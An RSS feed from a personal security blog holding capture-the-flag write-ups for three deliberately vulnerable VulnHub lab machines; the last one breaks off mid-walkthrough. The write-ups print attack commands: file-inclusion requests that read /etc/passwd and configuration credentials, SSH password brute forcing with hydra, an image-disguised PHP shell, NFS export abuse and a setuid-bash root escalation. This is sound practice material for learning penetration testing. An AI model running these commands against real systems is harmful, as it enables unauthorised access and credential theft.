<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Hacking on things...</title>
    <description>Always be learning. Push push push...
</description>
    <link>http://ado.im/blog/</link>
    <atom:link href="http://ado.im/blog/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Fri, 20 Jul 2018 12:36:02 -0600</pubDate>
    <lastBuildDate>Fri, 20 Jul 2018 12:36:02 -0600</lastBuildDate>
    <generator>Jekyll v3.5.1</generator>
    
      <item>
        <title>billu: b0x</title>
        <description>&lt;p&gt;billu: b0x is a boot-to-root vulnerable machine found on &lt;a href=&quot;https://www.vulnhub.com/entry/billu-b0x,188/&quot;&gt;VulnHub&lt;/a&gt;. I pulled this down and ran it in Virtualbox.&lt;/p&gt;

&lt;p&gt;Starting with an &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; we see there aren’t many options to attack this box, but
it does lead well to practice with enumeration.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -p- 192.168.1.147
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Starting Nmap 7.40 ( https://nmap.org ) at 2017-08-15 15:00 EDT
Nmap scan report for indishell.hsd1.co.comcast.net (192.168.1.147)
Host is up (0.00013s latency).
Not shown: 65533 closed ports
PORT &amp;amp;nbsp; STATE SERVICE
22/tcp open &amp;amp;nbsp;ssh
80/tcp open &amp;amp;nbsp;http
MAC Address: 08:00:27:1C:31:B1 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.52 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;[[image of nmap]]&lt;/p&gt;

&lt;p&gt;Let’s start by enumerating&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gobuster -u http://192.168.1.147 -w /usr/share/SecLists/Discovery/Web_Content/raft-large-directories.txt -e
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.1.147/
[+] Threads      : 10
[+] Wordlist     : /usr/share/SecLists/Discovery/Web_Content/raft-large-directories.txt
[+] Status codes : 301,302,307,200,204
[+] Expanded     : true
=====================================================
http://192.168.1.147/images (Status: 301)
http://192.168.1.147/add (Status: 200)
http://192.168.1.147/test (Status: 200)
http://192.168.1.147/c (Status: 200)
http://192.168.1.147/index (Status: 200)
http://192.168.1.147/panel (Status: 302)
http://192.168.1.147/in (Status: 200)
http://192.168.1.147/show (Status: 200)
http://192.168.1.147/uploaded_images (Status: 301)
http://192.168.1.147/head (Status: 200)
http://192.168.1.147/phpmy (Status: 301)
=====================================================&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;_&lt;/p&gt;

&lt;p&gt;Looking at the test.php file, we find that it is looking for a &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; parameter.
I tried passing this a GET request but that didn’t work so tested out with
a POST.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -XPOST -d&quot;file=/etc/passwd&quot; http://192.168.1.147/test
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Looking at the phpmy, I found that it’s phpmyadmin. That has some good
information in the config file.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -XPOST -d&quot;file=/var/www/phpmy/config.inc.php&quot; http://192.168.1.147/test
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The important piece is related to the username and password that is in the
phpmyadmin configuration file.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;$cfg['Servers'][$i]['user'] = 'root';
$cfg['Servers'][$i]['password'] = 'roottoor';&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I tried these credentials in the phpmyadmin login but they didn’t work.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Shortcut&lt;/strong&gt;
I found that I could ssh to the machine using root and the above password and
finish this machine, however figured I’d continue looking for a different way.&lt;/p&gt;

&lt;p&gt;Using the curl script, I decided to look through the index.php file and
associated included files until I found the c.php file&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -XPOST -d&quot;file=/var/www/c.php&quot; http://192.168.1.147/test
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This gives us the mysql connection string used by the login page.&lt;/p&gt;

&lt;p&gt;Using these credentials, (billu:b0x_billu) we are able to get into phpmyadmin.
_&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$conn = mysqli_connect(&quot;127.0.0.1&quot;,&quot;billu&quot;,&quot;b0x_billu&quot;,&quot;ica_lab&quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The auth table looks promising for information. Here we find another
username/password combination (passwords stored in plain text are good for
hackers)&lt;/p&gt;

&lt;p&gt;biLLu:hEx_it&lt;/p&gt;

&lt;p&gt;_&lt;/p&gt;

&lt;p&gt;Using this combination I was able to login to the application itself where there
is an option to add users. This form includes a file upload section, however
it’s limited to jpg, gif, and png.&lt;/p&gt;

&lt;p&gt;Through other enumeration, I was able to find a file include vulnerability in
the panel.php file so perhaps I could upload something through this image upload
and have it get included in this local file inclusion vulnerability.&lt;/p&gt;

&lt;p&gt;I can’t remember where I found this trick but you can start a file with a given
character set to make the file meta data look like a jpg file.&lt;/p&gt;

&lt;p&gt;https://github.com/aaronott/SecBucket/tree/master/images&lt;/p&gt;

&lt;p&gt;Using this file, I was able to add php to the end of this file and get it
executed using the local file include vulnerability.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;I was then able to bypass the filetype filtering in the php. On my attacking
machine I created a meterpreter listener.&lt;/p&gt;

&lt;p&gt;Calling the panel page using the &lt;code class=&quot;highlighter-rouge&quot;&gt;load&lt;/code&gt; parameter for the include, I was able to
get the uploaded image to execute.&lt;/p&gt;

</description>
        <pubDate>Tue, 15 Aug 2017 12:34:00 -0600</pubDate>
        <link>http://ado.im/blog/ctf/billu_box.html</link>
        <guid isPermaLink="true">http://ado.im/blog/ctf/billu_box.html</guid>
        
        
        <category>ctf</category>
        
      </item>
    
      <item>
        <title>Vulnix</title>
        <description>&lt;p&gt;Vulnix is a boot-to-root vulnerable machine found on &lt;a href=&quot;https://www.vulnhub.com/entry/hacklab-vulnix,48/&quot;&gt;VulnHub&lt;/a&gt;. I pulled this down and ran it in Virtualbox.&lt;/p&gt;

&lt;p&gt;Getting started we will us nmap to enumerate open ports.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -p -sV 192.168.1.130
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Starting Nmap 7.40 ( https://nmap.org ) at 2017-07-16 14:02 EDT
Nmap scan report for vulnix.hsd1.co.comcast.net (192.168.1.111)
Host is up (0.00034s latency).
Not shown: 65518 closed ports
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
25/tcp open smtp Postfix smtpd
79/tcp open finger Linux fingerd
110/tcp open pop3 Dovecot pop3d
111/tcp open rpcbind 2-4 (RPC #100000)
143/tcp open imap Dovecot imapd
512/tcp open exec?
513/tcp open login
514/tcp open tcpwrapped
993/tcp open ssl/imap Dovecot imapd
995/tcp open ssl/pop3 Dovecot pop3d
2049/tcp open nfs_acl 2-3 (RPC #100227)
39127/tcp open mountd 1-3 (RPC #100005)
46013/tcp open mountd 1-3 (RPC #100005)
51380/tcp open status 1 (RPC #100024)
51502/tcp open mountd 1-3 (RPC #100005)
51986/tcp open nlockmgr 1-4 (RPC #100021)
MAC Address: 08:00:27:53:D1:AF (Oracle VirtualBox virtual NIC)
Service Info: Host: vulnix; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.42 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vulnix/initial_nmap.png&quot; alt=&quot;Initial nmap&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can use the postfix server to check for existing users on the machine using the VRFY command.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;nc 192.168.1.130 25
220 vulnix ESMTP Postfix (Ubuntu)
EHLO example.com
250-vulnix
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250 DSN
VRFY root
252 2.0.0 root
VRFY aott
550 5.1.1 &amp;lt;aott&amp;gt;: Recipient address rejected: User unknown in local recipient table
VRFY admin
550 5.1.1 &amp;lt;admin&amp;gt;: Recipient address rejected: User unknown in local recipient table
VRFY vulnix
252 2.0.0 vulnix
VRFY dovecot
252 2.0.0 dovecot&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Using the &lt;code class=&quot;highlighter-rouge&quot;&gt;smtp-user-enum&lt;/code&gt; tool we can automate this and use a wordlist.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;# smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 192.168.1.130
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

----------------------------------------------------------
| Scan Information |
----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... /usr/share/wordlists/metasploit/unix_users.txt
Target count ............. 1
Username count ........... 112
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............

######## Scan started at Sat Jul 29 17:33:28 2017 #########
192.168.1.130: ROOT exists
192.168.1.130: backup exists
192.168.1.130: bin exists
192.168.1.130: daemon exists
192.168.1.130: games exists
192.168.1.130: gnats exists
192.168.1.130: irc exists
192.168.1.130: libuuid exists
192.168.1.130: lp exists
192.168.1.130: list exists
192.168.1.130: man exists
192.168.1.130: mail exists
192.168.1.130: messagebus exists
192.168.1.130: news exists
192.168.1.130: nobody exists
192.168.1.130: postmaster exists
192.168.1.130: proxy exists
192.168.1.130: root exists
192.168.1.130: sshd exists
192.168.1.130: sync exists
192.168.1.130: sys exists
192.168.1.130: syslog exists
192.168.1.130: user exists
192.168.1.130: uucp exists
192.168.1.130: www-data exists
######## Scan completed at Sat Jul 29 17:33:28 2017 #########
25 results.

112 queries in 1 seconds (112.0 queries / sec)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We can easily write all the existing users to a file to be used later.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 192.168.1.130 | grep exists | cut -d' ' -f2 &amp;gt; users_exist.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Using this list, we can use the fact that the finger port is open to see which of these users have a login shell.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;for i in $(cat users_exist.txt); do finger $i@192.168.1.130; done
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vulnix/fingering.png&quot; alt=&quot;finger&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Knowing the users that have a login shell, we stuff those into a file called users.txt and use hydra to bruteforce a login.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hydra -L users.txt -P /usr/share/SecLists/Passwords/10k_most_common.txt 192.168.1.130 ssh
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vulnix/hydra.png&quot; alt=&quot;hydra&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now that we have a valid username and password (user:letmein) we can use ssh to get in and start enumeration on the box.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vulnix/ssh-in.png&quot; alt=&quot;ssh with low priv&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On the box I start enumeration using steps here https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vulnix/exports.png&quot; alt=&quot;/etc/exports&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hmmm&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/home/vulnix	*(rw,root_squash)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Looking this up I found that the * here is a wildcard meaning that /home/vulnix can be mounted from anywhere. So, let’s mount it to my machine.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vulnix/mount_with_permission_denied.png&quot; alt=&quot;mount permission denied&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Well, we can’t get in there even with root. That’s what that root_squash setting does. We are only going to be able to get in there using the vulnix user, so we create a local vulnix user with the same uid(2008) and gid(2008) as the remote box.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vulnix/passwd_file.png&quot; alt=&quot;/etc/passwd&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After creating this user and switching, we are able to get into the /mnt/vulnix directory. Here we will create an ssh key that will allow us to ssh directly to the machine using the vulnix user.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vulnix/mounted-as-vulnix.png&quot; alt=&quot;Mounted as vulnix&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh-keygen -t rsa
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vulnix/create_ssh_key.png&quot; alt=&quot;create ssh key&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vulnix/mv_ssh_pub_key.png&quot; alt=&quot;Move pub key&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh vulnix@192.168.1.130 -i /home/vulnix/.ssh/id_rsa
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vulnix/ssh_with_vulnix.png&quot; alt=&quot;SSH as vulnix&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s see what the vulnix user can do with &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vulnix/sudo_l.png&quot; alt=&quot;sudo -l&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So we are able to edit the /etc/exports file and change that root_squash to no_root_squash.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;editsudo /etc/export
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;After changing this file, we would need to restart networking for the changes to take effect. Sadly we don’t have a user that can do that so we just manually reboot this. Obviously in a real situation we don’t have control to do this so we might have to get creative.&lt;/p&gt;

&lt;p&gt;Prior to rebooting, let’s copy /bin/bash to the /home/vulnix directory for some setuid fun.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vulnix/copy_bash.png&quot; alt=&quot;copy bash&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After the reboot, we remount /home/vulnix and are now able access that directory with the root user.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vulnix/setuid_bash.png&quot; alt=&quot;set uid&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd /mnt/vulnix
chown root bash
chmod 4755 bash
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Now we have everything we need to escalate to root.&lt;/p&gt;

&lt;p&gt;On the victim machine as the vulnix user, we run &lt;code class=&quot;highlighter-rouge&quot;&gt;bash -p&lt;/code&gt; to keep permissions of the user.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vulnix/escalation_to_root.png&quot; alt=&quot;Escalate&quot; /&gt;&lt;/p&gt;

&lt;p&gt;BOOM! Done.&lt;/p&gt;
</description>
        <pubDate>Fri, 28 Jul 2017 12:34:00 -0600</pubDate>
        <link>http://ado.im/blog/ctf/vulnix.html</link>
        <guid isPermaLink="true">http://ado.im/blog/ctf/vulnix.html</guid>
        
        
        <category>ctf</category>
        
      </item>
    
      <item>
        <title>Stapler</title>
        <description>&lt;p&gt;Stapler is a boot-to-root vulnerable machine that was found on &lt;a href=&quot;https://www.vulnhub.com/entry/stapler-1,150/&quot;&gt;Vulnhub&lt;/a&gt;. The machine was not super difficult, however it does certainly reward enumeration. This is certainly not surprising given that the machine was created by g0tmi1k.&lt;/p&gt;

&lt;p&gt;This is by no means the only correct way to pass this machine and gain root access, it is just the way I found to do it.&lt;/p&gt;

&lt;p&gt;First, start with nmap:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -p- 192.168.1.116&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ports open: PORT STATE SERVICE
21/tcp open ftp
22/tcp open ssh
53/tcp open domain
80/tcp open http
139/tcp open netbios-ssn
666/tcp open doom
3306/tcp open mysql
12380/tcp open unknown
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;This returns a list of open ports that can be used to further enumerate each service.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Port 21:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Connecting to FTP we are presented a message:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;220-
220-|-----------------------------------------------------------------------------------------|
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-|-----------------------------------------------------------------------------------------|
220-
220
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image.png&quot; alt=&quot;img of ftp output&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We are able to login anonymously and find that there is a file available for download.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image2.png&quot; alt=&quot;img of ftp output&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Download the note and read it:
Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image3.png&quot; alt=&quot;img of ftp output&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Using nmap to get the version of FTP: vsftpd 2.0.8 or later&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image13.png&quot; alt=&quot;img of ftp output&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Port 22:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;When using ssh to connect to the box, we see another message:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-----------------------------------------------------------------
~ Barry, don't forget to put a message here ~
-----------------------------------------------------------------
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;using netcat, we can see that the ssh version is: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Port 139:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;enum4linux reveals quite a bit of information for this server, including a list of valid users and 2 mount points.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# enum4linux 192.168.1.116
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Jul 16 11:36:25 2017
==========================
| Target Information     |
==========================
Target ........... 192.168.1.116
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

==========================================
| Share Enumeration on 192.168.1.116     |
==========================================
WARNING: The &quot;syslog&quot; option is deprecated
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]

Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]
Sharename Type Comment
--------- ---- -------
print$    Disk  Printer Drivers
kathy     Disk  Fred, What are we doing here?
tmp       Disk  All temporary files should be stored here
IPC$      IPC   IPC Service (red server (Samba, Ubuntu))


Server    Comment
--------- -------
LINKSYS01751 Samba 3.0.28a
RED        red server (Samba, Ubuntu)

Workgroup  Master
---------  --------
WORKGROUP LINKSYS01751

[+] Attempting to map shares on 192.168.1.116
//192.168.1.116/print$ Mapping: DENIED, Listing: N/A
//192.168.1.116/kathy Mapping: OK, Listing: OK
//192.168.1.116/tmp Mapping: OK, Listing: OK
//192.168.1.116/IPC$ Mapping: OK Listing: DENIED

...

S-1-22-1-1000 Unix User\peter (Local User)
S-1-22-1-1001 Unix User\RNunemaker (Local User)
S-1-22-1-1002 Unix User\ETollefson (Local User)
S-1-22-1-1003 Unix User\DSwanger (Local User)
S-1-22-1-1004 Unix User\AParnell (Local User)
S-1-22-1-1005 Unix User\SHayslett (Local User)
S-1-22-1-1006 Unix User\MBassin (Local User)
S-1-22-1-1007 Unix User\JBare (Local User)
S-1-22-1-1008 Unix User\LSolum (Local User)
S-1-22-1-1009 Unix User\IChadwick (Local User)
S-1-22-1-1010 Unix User\MFrei (Local User)
S-1-22-1-1011 Unix User\SStroud (Local User)
S-1-22-1-1012 Unix User\CCeaser (Local User)
S-1-22-1-1013 Unix User\JKanode (Local User)
S-1-22-1-1014 Unix User\CJoo (Local User)
S-1-22-1-1015 Unix User\Eeth (Local User)
S-1-22-1-1016 Unix User\LSolum2 (Local User)
S-1-22-1-1017 Unix User\JLipps (Local User)
S-1-22-1-1018 Unix User\jamie (Local User)
S-1-22-1-1019 Unix User\Sam (Local User)
S-1-22-1-1020 Unix User\Drew (Local User)
S-1-22-1-1022 Unix User\SHAY (Local User)
S-1-22-1-1023 Unix User\Taylor (Local User)
S-1-22-1-1024 Unix User\mel (Local User)
S-1-22-1-1025 Unix User\kai (Local User)
S-1-22-1-1026 Unix User\zoe (Local User)
S-1-22-1-1027 Unix User\NATHAN (Local User)
S-1-22-1-1028 Unix User\www (Local User)
S-1-22-1-1029 Unix User\elly (Local User)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;Port 666:&lt;/strong&gt;
Using netcat to connect to port 666 we see a bunch of gibberish.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image4.png&quot; alt=&quot;image of gibberish&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If we capture this gibberish out to a file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image5.png&quot; alt=&quot;image of gibberish&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We see that it’s a zip file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image6.png&quot; alt=&quot;img message2.jpg&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This contains an interesting file message2.jpg.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Port 3306:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;I don’t have a valid username or password for mysql, but I was able to find the mysql version using netcat.&lt;/p&gt;

&lt;p&gt;5.7.12-0ubuntu1&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image7.png&quot; alt=&quot;img mysql version&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Port 12380:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Using curl, I looked at http and https for this port to find that https was a bit more promising.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image8.png&quot; alt=&quot;img curl 12380&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image9.png&quot; alt=&quot;img curl 12380 https&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image10.png&quot; alt=&quot;img browser 12380 https&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I ran gobuster to enumerate directories using a wordlist and found some interesting directories.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image11.png&quot; alt=&quot;gobuster&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In announcements, there is a message that could lead to more information, but not super helpful to us right now.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image12.png&quot; alt=&quot;announcements&quot; /&gt;&lt;/p&gt;

&lt;p&gt;phpmyadmin exposed is dangerous, however, since I still don’t have credentials to login there, I will leave this for a bit later.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image20.png&quot; alt=&quot;announcements&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looking at https://192.168.1.116:12380/phpmyadmin/doc/html/index.html I was able to determine the current version of phpmyadmin to be 4.5.4.1.&lt;/p&gt;

&lt;h2 id=&quot;inventory&quot;&gt;Inventory&lt;/h2&gt;
&lt;p&gt;After enumerating all the ports, let’s take an inventory of what we have.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Running software:&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Apache 2.4.18&lt;/li&gt;
  &lt;li&gt;Ubuntu&lt;/li&gt;
  &lt;li&gt;mysql 5.7.12-0ubuntu1&lt;/li&gt;
  &lt;li&gt;vsftpd 2.0.8&lt;/li&gt;
  &lt;li&gt;A list of users and some mount points.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Connecting to the mount points didn’t reveal anything interesting so I decided to take the users I’d collected and use hydra to brute force some passwords.&lt;/p&gt;

&lt;h2 id=&quot;bruteforce&quot;&gt;Bruteforce&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hydra -L users.txt -P /usr/share/SecLists/Passwords/500-worst-passwords.txt 192.168.1.116 ssh
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image14.png&quot; alt=&quot;Bruteforce&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now I have 3 accounts that I can use to ssh to the box.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;JBare: cookie&lt;/li&gt;
  &lt;li&gt;MFrei: letmein&lt;/li&gt;
  &lt;li&gt;Drew: qwerty&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image15.png&quot; alt=&quot;access through ssh&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Using the password (cookie) from above I was able to ssh to the machine.&lt;/p&gt;

&lt;p&gt;I then started with the enumeration steps on the box itself. https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ls -lart /etc/cron.d/*&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;logrotate looked interesting as it calls to a script using the root user.
&lt;img src=&quot;/assets/images/stapler/image16.png&quot; alt=&quot;logrotate&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ls -l /usr/local/sbin/cron-logrotate.sh&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cat /usr/local/sbin/cron-logrotate.sh&lt;/code&gt;&lt;/p&gt;

